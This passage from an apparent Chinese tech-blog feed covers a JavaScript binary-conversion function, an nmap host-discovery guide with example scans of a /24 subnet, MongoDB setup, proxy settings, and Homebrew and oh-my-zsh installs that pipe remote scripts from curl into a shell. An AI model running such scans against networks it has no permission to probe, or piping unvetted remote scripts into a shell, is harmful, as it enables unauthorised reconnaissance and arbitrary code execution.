class="headerlink" title="十进制转二进制"></a><u><strong>十进制转二进制</strong></u></h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">TtoT</span> = <span class="keyword">function</span>(<span class="params">numbers</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> stack = <span class="keyword">new</span> <span class="title class_">Stack</span>()</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(numbers&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> temp = numbers % <span class="number">2</span></span><br><span class="line">        stack.<span class="title function_">push</span>(temp)</span><br><span class="line">        numbers = (numbers/<span class="number">2</span>)|<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!stack.<span class="title function_">isEmpty</span>())&#123;</span><br><span class="line">        result+=stack.<span class="title function_">pop</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
          <category> JavaScript </category>
          
          <category> 算法 </category>
          
          <category> 栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 算法 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap的命令详解</title>
      <link href="/nmap%E7%9A%84%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3.htm"/>
      <url>/nmap%E7%9A%84%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3.htm</url>
      
        <content type="html"><![CDATA[<h1 id="nmap的介绍"><a href="#nmap的介绍" class="headerlink" title="nmap的介绍"></a>nmap的介绍</h1><p><a href="https://zh.wikipedia.org/wiki/Nmap"><strong>Nmap</strong></a>（<strong>网络映射器</strong>）是一款用于<a href="https://zh.wikipedia.org/w/index.php?title=网络发现&action=edit&redlink=1">网络发现</a>和<a href="https://zh.wikipedia.org/w/index.php?title=安全审计&action=edit&redlink=1">安全审计</a>的<a href="https://zh.wikipedia.org/wiki/网络安全">网络安全</a>工具，它是<a href="https://zh.wikipedia.org/wiki/自由软件">自由软件</a>。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于：</p><ul><li>列举网络主机清单</li><li>管理服务升级调度</li><li>监控主机</li><li>服务运行状况</li></ul><p>以上简介来源维基百科</p><hr><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><ul><li><h5 id="CIDR-无类别域间路由，Classless-Inter-Domain-Routing"><a href="#CIDR-无类别域间路由，Classless-Inter-Domain-Routing" class="headerlink" title="CIDR(无类别域间路由，Classless Inter-Domain Routing)"></a>CIDR(无类别域间路由，Classless Inter-Domain Routing)</h5><ul><li><p>查看本机ip </p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200309111920303.png" alt="image-20200309111920303"></p></li><li><p>ipv4地址为:10.0.0.11 子网掩码为 0xffffff00 即转换后为 255.255.255.0</p></li></ul></li><li><p>得出网络地址为<strong>10.0.0.0</strong> 主机号为<strong>11</strong></p></li><li><p><strong>在该网络地址中，256个主机</strong></p></li><li><p>用CIDR可表示为:<strong>10.0.0.11/24</strong></p></li><li><p>其中/24为子网掩码的位数：<br>  <u>A类IP地址的默认子网掩码为255.0.0.0（由于255相当于二进制的8位1，所以也缩写成“/8”，表示网络号占了8位）; 即11111111.00000000.00000000.00000000</u></p><p><u>B类的为255.255.0.0(/16)  即11111111.11111111.00000000.00000000</u></p><p><u>C类的为255.255.255.0(/24)  即11111111.11111111.11111111.00000000</u></p><p><u>/30就是255.255.255.252  即11111111.11111111.11111111.11111100</u></p><p><u>/32就是255.255.255.255. 即11111111.11111111.11111111.11111111</u></p></li></ul><hr><h1 id="nmap指令介绍及使用"><a href="#nmap指令介绍及使用" class="headerlink" title="nmap指令介绍及使用"></a>nmap指令介绍及使用</h1><ul><li><p><strong>-sL</strong><br>该命令仅仅列出指定网络上的每台主机的，不会向目标主机发送任何报文。端口扫描、操作系统探测或者ping扫描，在该命令下不会被执行。</p><ul><li><p>扫描10.0.0.11/24</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sL <span class="number">10.0.0.11</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200309150550423.png" alt="image-20200309150550423"></p></li></ul></li></ul><ul><li><h5 id="sP-Ping扫描"><a href="#sP-Ping扫描" class="headerlink" title="-sP(Ping扫描)"></a>-sP(Ping扫描)</h5><p>该选项告诉Nmap仅仅 进行ping扫描 (主机发现)，然后打印出对扫描做出响应的那些主机。</p><p>选项在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP <span class="number">10.0.0.11</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200309153717752.png" alt="image-20200309153717752"></p></li><li><h5 id="P0-无ping"><a href="#P0-无ping" class="headerlink" title="-P0(无ping)"></a>-P0(无ping)</h5><p>用-P0选项会使Nmap对每一个指定的目标IP地址进行所要求的扫描。所以如果在命令行指定一个B类目标地址空间(/16)， 所有 65,536个IP地址都会被扫描。</p><p><strong>即扫描ip下所有端口</strong></p></li><li><h5 id="PS-portlist-TCP-SYN-Ping"><a href="#PS-portlist-TCP-SYN-Ping" class="headerlink" title="-PS [portlist] (TCP SYN Ping)"></a>-PS [portlist] (TCP SYN Ping)</h5><p>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变nmap.h) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指<br>定。甚至可以指定一个以逗号分隔的端口列表(如 -PS22，23，25，80，113，1050，35000)，在这种情况下，每个端口会被并发地扫描。</p><p><strong>可以扫描特定端口</strong></p></li><li><h5 id="PA-portlist-TCP-ACK-Ping"><a href="#PA-portlist-TCP-ACK-Ping" class="headerlink" title="-PA [portlist] (TCP ACK Ping)"></a>-PA [portlist] (TCP ACK Ping)</h5><p>TCP ACK ping和刚才讨论的-PS参数类似。不过选择-PA向目标发送的是ACK标志位而不是SYN。如果客户端向目标主机知识发送一个标志位为ACK的数据包，那么服务器就有理由认为这个数据包出问题，并回复一个RST的报文。</p></li><li><h5 id="PU-portlist-UDP-ping"><a href="#PU-portlist-UDP-ping" class="headerlink" title="-PU [portlist] (UDP ping)"></a>-PU [portlist] (UDP ping)</h5><p>发送一个空的的 UDP报文到给定的端口(默认是31338)。如果目标主机的端口是关闭的话，UDP探测马上得到一个ICMP端口无法达到的回应报文。</p><p>这时，说明目标主机开启。而出现例如：TTL超时则表示该主机未开启。同时，这种方式可以绕过过滤以TCP方式探测的包。</p><p><strong>可以以udp扫描特定端口或者全部端口</strong>，很快</p></li><li><h5 id="PE；-PP；-PM-ICMP-Ping-Types"><a href="#PE；-PP；-PM-ICMP-Ping-Types" class="headerlink" title="-PE；-PP；-PM(ICMP Ping Types)"></a>-PE；-PP；-PM(ICMP Ping Types)</h5><p>-PE：Nmap发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。-PE用于打开该回声请求功能。</p><p>-PP、-PM：时间戳和地址掩码查询。</p></li><li><h5 id="PR-ARP-Ping"><a href="#PR-ARP-Ping" class="headerlink" title="-PR(ARP Ping)"></a>-PR(ARP Ping)</h5><p>基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件 地址(ARP)，这样它才能把以太帧送往正确的地址。</p></li><li><h5 id="n-不用域名解析"><a href="#n-不用域名解析" class="headerlink" title="-n (不用域名解析)"></a>-n (不用域名解析)</h5></li></ul><ul><li><h5 id="R-为所有目标解析域名"><a href="#R-为所有目标解析域名" class="headerlink" title="-R (为所有目标解析域名)"></a>-R (为所有目标解析域名)</h5></li></ul><ul><li><h5 id="–system-dns-使用系统域名解析器"><a href="#–system-dns-使用系统域名解析器" class="headerlink" title="–system-dns (使用系统域名解析器)"></a>–system-dns (使用系统域名解析器)</h5></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> nmap </category>
          
          <category> 命令 </category>
          
          <category> 使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Services </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB安装</title>
      <link href="/%E5%AE%89%E8%A3%85MongoDB.htm"/>
      <url>/%E5%AE%89%E8%A3%85MongoDB.htm</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB安装"><a href="#MongoDB安装" class="headerlink" title="MongoDB安装"></a>MongoDB安装</h1><h2 id="安装Server"><a href="#安装Server" class="headerlink" title="安装Server"></a>安装Server</h2><ol><li><p><a href="https://www.mongodb.com/download-center/community找安装包TGZ//https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-4.4.6.tgz">https://www.mongodb.com/download-center/community找安装包TGZ//https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-4.4.6.tgz</a></p></li><li><p>Wget后创建一个dbpath的文件夹记得给权限</p></li><li><p>给MongoDB文件夹添加环境变量<br>vi /etc/profile</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">MONGODBPATH</span>=&lt;mongodb-install-directory&gt;</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$MONGODBPATH/bin</span><br><span class="line"><span class="comment">#&lt;mongodb-install-directory&gt; 为MongoDB 的安装路径  </span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">MONGODBPATH</span>=/mongodb</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$MONGODBPATH/bin</span><br></pre></td></tr></table></figure></li><li><p><strong>命令方式启动MongoDB</strong></p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/mongodb/bin/mongod</span> <span class="params">--fork</span> <span class="params">--dbpath</span> <span class="string">&quot;/root/db/&quot;</span> <span class="params">--logpath</span> <span class="string">&quot;/root/db/log&quot;</span> <span class="params">--bind_ip_all</span> <span class="params">--port</span> 12345</span><br><span class="line"><span class="comment">#这是命令指定启动，比较麻烦</span></span><br><span class="line"><span class="comment">#fork是驻后台 dbpath是数据库数据存放文件路径 logpath是log文件路径</span></span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><strong>配置文件方式启动MongoDB</strong></li></ol><p>   vi  <mongodb-install-directory>/bin/mongodb.conf</mongodb-install-directory></p>   <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">dbpath</span> = /root/db/ <span class="comment">#数据文件存放目录</span></span><br><span class="line"><span class="attr">logpath</span> = /root/db/log   <span class="comment">#日志文件存放目录</span></span><br><span class="line"><span class="attr">port</span> = <span class="number">12345</span>  <span class="comment">#端口</span></span><br><span class="line"><span class="attr">fork</span> = <span class="literal">true</span>  <span class="comment">#以守护程序的方式启用，即在后台运行</span></span><br><span class="line"><span class="attr">auth</span>=<span class="literal">true</span> <span class="comment">#验证用户名密码</span></span><br><span class="line"><span class="attr">logappend</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">bind_ip</span>=<span class="number">0.0</span>.<span class="number">0.0</span> <span class="comment">#这里默认是127.0.0.1, 设置成0.0.0.0是表示所有IP地址都可以访问(后面会具体介绍)</span></span><br><span class="line"><span class="comment">#这种以配置文件启动方式比较方便，在程序bin目录里vi mongodb.conf</span></span><br></pre></td></tr></table></figure>   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mongod -f ./mongodb.conf <span class="comment">#启动</span></span><br></pre></td></tr></table></figure><p>设置开机自启动<br>vi /usr/lib/systemd/system/mongodb.service</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">写入以下内容:</span><br><span class="line">    [Unit]</span><br><span class="line">    <span class="attribute">Description</span>=mongodb </span><br><span class="line">    <span class="attribute">After</span>=network.target remote-fs.target nss-lookup.target</span><br><span class="line">     </span><br><span class="line">    [Service]</span><br><span class="line">    <span class="attribute">Type</span>=forking</span><br><span class="line">    <span class="attribute">ExecStart</span>=/mongodb/bin/mongod -f /mongodb/bin/mongodb.conf</span><br><span class="line">    <span class="attribute">ExecReload</span>=/bin/kill -s HUP <span class="variable">$MAINPID</span></span><br><span class="line">    <span class="attribute">ExecStop</span>=/mongodb/bin/mongod --shutdown -f /mongodb/bin/mongodb.conf</span><br><span class="line">    <span class="attribute">PrivateTmp</span>=<span class="literal">true</span></span><br><span class="line">      </span><br><span class="line">    [Install]</span><br><span class="line">    <span class="attribute">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><p>重载系统服务</p><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line"><span class="params">system</span>ctl daemon-reload</span><br><span class="line"><span class="params">system</span>ctl enable mongodb</span><br><span class="line"><span class="params">system</span>ctl start mongodb</span><br></pre></td></tr></table></figure><ol start="6"><li><p>创建一个root用户,超级管理员可以管理MongoDB下的所有库以及权限、备份及集群等操作.</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> admin</span><br><span class="line"><span class="keyword">db</span>.createUser(&#123;user:<span class="string">&quot;用户名&quot;</span>, <span class="keyword">pwd</span>: <span class="string">&quot;密码&quot;</span>, roles: [<span class="string">&quot;root&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure></li></ol><ol start="7"><li><p>在本地进admin库里添加用户</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;<span class="attr">user</span>: <span class="string">&quot;用户名&quot;</span>,<span class="attr">pwd</span>: <span class="string">&quot;密码&quot;</span>,<span class="attr">roles</span>:[&#123; <span class="attr">role</span>:<span class="string">&quot;userAdminAnyDatabase&quot;</span>,<span class="attr">db</span>:<span class="string">&quot;admin&quot;</span>&#125;] &#125;);</span><br><span class="line"><span class="comment">#认证方法db.auth(&quot;用户名&quot;,&quot;密码&quot;)</span></span><br><span class="line">db.<span class="title function_ invoke__">updateUser</span>(</span><br><span class="line"> <span class="string">&quot;用户名&quot;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">           roles : [</span><br><span class="line">                     &#123;<span class="string">&quot;role&quot;</span> : <span class="string">&quot;userAdminAnyDatabase&quot;</span>,<span class="string">&quot;db&quot;</span> : <span class="string">&quot;admin&quot;</span>&#125;,</span><br><span class="line">                     &#123;<span class="string">&quot;role&quot;</span> : <span class="string">&quot;dbOwner&quot;</span>,<span class="string">&quot;db&quot;</span> : <span class="string">&quot;admin&quot;</span>&#125;,</span><br><span class="line">                     &#123;<span class="string">&quot;role&quot;</span> : <span class="string">&quot;clusterAdmin&quot;</span>, <span class="string">&quot;db&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">                   ]</span><br><span class="line">        &#125;</span><br><span class="line"> )</span><br><span class="line"><span class="comment">#添加权限</span></span><br><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;<span class="attr">user</span>:<span class="string">&quot;用户名&quot;</span>,<span class="attr">pwd</span>:<span class="string">&quot;密码&quot;</span>,<span class="attr">roles</span>:[&#123;<span class="attr">role</span>:<span class="string">&quot;readWrite&quot;</span>,<span class="attr">db</span>:<span class="string">&quot;数据库名&quot;</span>&#125;]&#125;);</span><br><span class="line"><span class="comment">#普通用户添加</span></span><br></pre></td></tr></table></figure></li><li><p>开机自启设置<br>vim /etc/rc.d/init.d/mongod</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#记得替换MongoDB程序目录</span></span><br><span class="line">start() &#123;</span><br><span class="line"><span class="regexp">/mongodb/</span>bin<span class="regexp">/mongod  --config /m</span>ongodb<span class="regexp">/bin/m</span>ongodb.conf</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop() &#123;</span><br><span class="line"><span class="regexp">/mongodb/</span>bin<span class="regexp">/mongod --config /m</span>ongodb<span class="regexp">/bin/m</span>ongodb.conf --shutdown</span><br><span class="line">&#125;</span><br><span class="line">case <span class="string">&quot;$1&quot;</span> <span class="keyword">in</span></span><br><span class="line">  start)</span><br><span class="line"> start</span><br><span class="line"> ;;</span><br><span class="line"></span><br><span class="line">stop)</span><br><span class="line"> stop</span><br><span class="line"> ;;</span><br><span class="line"></span><br><span class="line">restart)</span><br><span class="line"> stop</span><br><span class="line"> start</span><br><span class="line"> ;;</span><br><span class="line">  *)</span><br><span class="line"> echo</span><br><span class="line">$<span class="string">&quot;Usage: $0 &#123;start|stop|restart&#125;&quot;</span></span><br><span class="line"> <span class="keyword">exit</span> <span class="number">1</span></span><br><span class="line">esac</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chmod +x <span class="regexp">/etc/</span>rc.d<span class="regexp">/init.d/m</span>ongod</span><br><span class="line">service stop mongod</span><br><span class="line">service start mongod</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> MongoDB </category>
          
          <category> MongoDB Server安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> MongoDB Server </tag>
            
            <tag> Centos 7 </tag>
            
            <tag> 安装服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iTerm2代理设置及使用快捷键</title>
      <link href="/iTerm2%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE.htm"/>
      <url>/iTerm2%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE.htm</url>
      
        <content type="html"><![CDATA[<h1 id="iTerm2代理设置及使用快捷键"><a href="#iTerm2代理设置及使用快捷键" class="headerlink" title="iTerm2代理设置及使用快捷键"></a>iTerm2代理设置及使用快捷键</h1><p>快捷键:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> + t 新建标签</span><br><span class="line"><span class="built_in">command</span> + w 关闭标签</span><br><span class="line"><span class="built_in">command</span> + 数字 <span class="built_in">command</span> + 左右方向键    切换标签</span><br><span class="line"><span class="built_in">command</span> + enter 切换全屏</span><br><span class="line"><span class="built_in">command</span> + f 查找</span><br><span class="line"><span class="built_in">command</span> + d 水平分屏</span><br><span class="line"><span class="built_in">command</span> + <span class="built_in">shift</span> + d 垂直分屏</span><br><span class="line"><span class="built_in">command</span> + option + 方向键 <span class="built_in">command</span> + [ 或 <span class="built_in">command</span> + ]    切换屏幕</span><br><span class="line"><span class="built_in">command</span> + ; 查看历史命令</span><br><span class="line"><span class="built_in">command</span> + <span class="built_in">shift</span> + h 查看剪贴板历史</span><br><span class="line">ctrl + u    清除当前行</span><br><span class="line">ctrl + l    清屏</span><br><span class="line">ctrl + a    到行首</span><br><span class="line">ctrl + e    到行尾</span><br><span class="line">ctrl + f/b  前进后退</span><br><span class="line">ctrl + p    上一条命令</span><br><span class="line">ctrl + r    搜索命令历史</span><br></pre></td></tr></table></figure><p>代理设置:</p><p><code>vi ~/.zshrc</code></p><p>在最下面加上:</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Proxy_v2ray</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">http_proxy</span>=socks5://127.0.0.1:1080 # 配置http访问的</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">https_proxy</span>=socks5://127.0.0.1:1080 # 配置https</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">all_proxy</span>=socks5://127.0.0.1:1080 # 配置http和https访问</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MacOs </category>
          
          <category> Software </category>
          
          <category> iTerm2代理设置及使用快捷键 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MacOs </tag>
            
            <tag> Software </tag>
            
            <tag> iTerm2 </tag>
            
            <tag> 代理 </tag>
            
            <tag> 使用快捷键 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/Homebrew%E5%AE%89%E8%A3%85.htm"/>
      <url>/Homebrew%E5%AE%89%E8%A3%85.htm</url>
      
        <content type="html"><![CDATA[<h1 id="HomeBrew安装"><a href="#HomeBrew安装" class="headerlink" title="HomeBrew安装"></a>HomeBrew安装</h1><h5 id="首先区分Brew和Brew-cask"><a href="#首先区分Brew和Brew-cask" class="headerlink" title="首先区分Brew和Brew cask"></a>首先区分Brew和Brew cask</h5><ol><li>Brew是从下载源码解压然后 ./configure &amp;&amp; make install ，同时会包含相关依存库。并自动配置好各种环境变量，而且易于卸载。 这个对程序员来说简直是福音，简单的指令，就能快速安装和升级本地的各种开发环境。</li><li>Brew cask是 已经编译好了的应用包 （.dmg/.pkg），仅仅是下载解压，放在统一的目录中（/opt/homebrew-cask/Caskroom），省掉了自己去下载、解压、拖拽（安装）等蛋疼步骤，同样，卸载相当容易与干净。这个对一般用户来说会比较方便，包含很多在 AppStore 里没有的常用软件。</li></ol><h5 id="下面为安装方法"><a href="#下面为安装方法" class="headerlink" title="下面为安装方法"></a>下面为安装方法</h5><ol><li><p>首先配置代理</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">http_proxy</span>=socks5://127.0.0.1:1080 # 配置http访问的</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">https_proxy</span>=socks5://127.0.0.1:1080 # 配置https</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">all_proxy</span>=socks5://127.0.0.1:1080 # 配置http和https访问</span><br></pre></td></tr></table></figure></li><li><p>先安装xcode或者Command Line Tools for Xcode</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">xcode-<span class="keyword">select</span> <span class="comment">--install</span></span><br></pre></td></tr></table></figure></li><li><p>安装HomeBrew(<a href="https://brew.sh/">https://brew.sh/</a>)</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>bash -c <span class="string">&quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h5 id="以下为卸载及基本指令介绍"><a href="#以下为卸载及基本指令介绍" class="headerlink" title="以下为卸载及基本指令介绍"></a>以下为卸载及基本指令介绍</h5><p>删除HomeBrew</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>基本指令</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">brew search mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装包</span></span><br><span class="line">brew install mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看包信息，比如目前的版本，依赖，安装后注意事项等</span></span><br><span class="line">brew info mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载包</span></span><br><span class="line">brew uninstall wget</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示已安装的包</span></span><br><span class="line">brew list</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看brew的帮助</span></span><br><span class="line">brew –help</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新， 这会更新 Homebrew 自己</span></span><br><span class="line">brew update</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查过时（是否有新版本），这会列出所有安装的包里，哪些可以升级</span></span><br><span class="line">brew outdated</span><br><span class="line">brew outdated mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">// 升级所有可以升级的软件们</span></span><br><span class="line">brew upgrade</span><br><span class="line">brew upgrade mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理不需要的版本极其安装包缓存</span></span><br><span class="line">brew cleanup</span><br><span class="line">brew cleanup mysql</span><br></pre></td></tr></table></figure><p>拓展插件Homebrew Cask</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">安装</span><br><span class="line"></span><br><span class="line">brew install caskroom/cask/brew-cask</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装</span></span><br><span class="line"></span><br><span class="line">brew cask install google-chrome</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载</span></span><br><span class="line"></span><br><span class="line">brew cask uninstall google-chrome</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MacOs </category>
          
          <category> Service </category>
          
          <category> HomeBrew安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Service </tag>
            
            <tag> MacOs </tag>
            
            <tag> HomeBrew </tag>
            
            <tag> 安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iTerm安装及优化</title>
      <link href="/iTerm%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96.htm"/>
      <url>/iTerm%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96.htm</url>
      
        <content type="html"><![CDATA[<h1 id="iTerm安装及其优化"><a href="#iTerm安装及其优化" class="headerlink" title="iTerm安装及其优化"></a>iTerm安装及其优化</h1><h3 id="iTerm2下载"><a href="#iTerm2下载" class="headerlink" title="iTerm2下载"></a>iTerm2下载</h3><p><a href="https://www.iterm2.com/">https://www.iterm2.com/</a></p><p>安装即可</p><p>默认终端为bash</p><p>安装完修改zsh为默认终端</p><p>chsh -s /bin/zsh</p><h5 id="安装完建议去设置代理先"><a href="#安装完建议去设置代理先" class="headerlink" title="安装完建议去设置代理先"></a><strong>安装完建议去设置代理先</strong></h5><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="替换背景图片"><a href="#替换背景图片" class="headerlink" title="替换背景图片"></a>替换背景图片</h3><p>打开路径:iterm2 -&gt; Preferences -&gt; Profiles -&gt; window -&gt; Background Image</p><p>选择一张自己喜欢的壁纸即可</p><p>可以通过Blending调节壁纸的透明度: 透明度为0的时候,背景变为纯色(黑色)</p><h3 id="安装Oh-my-zsh"><a href="#安装Oh-my-zsh" class="headerlink" title="安装Oh my zsh"></a>安装Oh my zsh</h3><p>zsh的功能极其强大，只是配置过于复杂,通过<code>Oh my zsh</code>可以很快配置zsh。</p><p>这里只做简单的配置,如需要深入了解,可以查看:<a href="https://www.jianshu.com/p/d194d29e488c?open_source=weibo_search">《oh-my-zsh,让你的终端从未这么爽过》</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>oh-my-zsh开源地址：<a href="https://github.com/robbyrussell/oh-my-zsh">《oh-my-zsh》</a></p><h3 id="安装PowerFonts"><a href="#安装PowerFonts" class="headerlink" title="安装PowerFonts"></a>安装PowerFonts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> </span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/powerline/fonts.git --depth=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> fonts</span><br><span class="line"></span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure><p>iTerm2 -&gt; Preferences -&gt; Profiles -&gt; Text -&gt; Fonts </p><p>切换到Meslo LG S for Powerline字体，系统终端也要切换，因为不然下面的主题有个箭头符号会显示问号</p><h3 id="更改主题"><a href="#更改主题" class="headerlink" title="更改主题"></a>更改主题</h3><p><code>vi ~/.zshrc</code></p><p>修改ZSH_THEME为agnoster</p><p>更多主题如下:</p><p><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/themes">https://github.com/ohmyzsh/ohmyzsh/wiki/themes</a></p><h3 id="安装命令补全插件-可选择装但是我不会装的"><a href="#安装命令补全插件-可选择装但是我不会装的" class="headerlink" title="安装命令补全插件(可选择装但是我不会装的)"></a>安装命令补全插件(可选择装但是我不会装的)</h3><p>跟代码高亮的安装方式一样，这也是一个zsh的插件，叫做zsh-autosuggestion，用于命令建议和补全。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd ~<span class="regexp">/.oh-my-zsh/</span>custom<span class="regexp">/plugins/</span></span><br><span class="line"></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-autosuggestions</span><br><span class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure><p>找到plugins，加上这个插件即可</p><h3 id="安装高亮插件"><a href="#安装高亮插件" class="headerlink" title="安装高亮插件"></a>安装高亮插件</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd ~<span class="regexp">/.oh-my-zsh/</span>custom<span class="regexp">/plugins/</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-syntax-highlighting.git</span><br><span 